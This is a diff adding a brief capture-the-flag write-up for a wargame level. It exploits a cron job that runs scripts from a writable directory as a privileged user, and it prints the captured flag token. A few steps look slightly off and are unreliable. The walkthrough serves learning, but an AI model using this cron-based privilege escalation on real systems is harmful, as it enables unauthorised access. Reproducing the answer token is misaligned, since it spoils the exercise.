@@ -1,0 +1,23 @@
+We can see a cronjob in /rofs/var/mail/level05 who execute a script with flag05 wrights every two minuts.
+
+$> cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+$> cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+We write a script that will be launched by cronjob at /opt/openarenaserver/
+$> touch getouput
+$> echo "/bin/getflag > /tmp/output.log ; chmod +x /tmp/output.log" > getouput
+
+We wait until cronjob do his task
+
+When the task is complet we open the folder created /tmp/output.log
+
+$> cat output.log
+Check flag.Here is your token : viuaaale9huek52boumoomioc
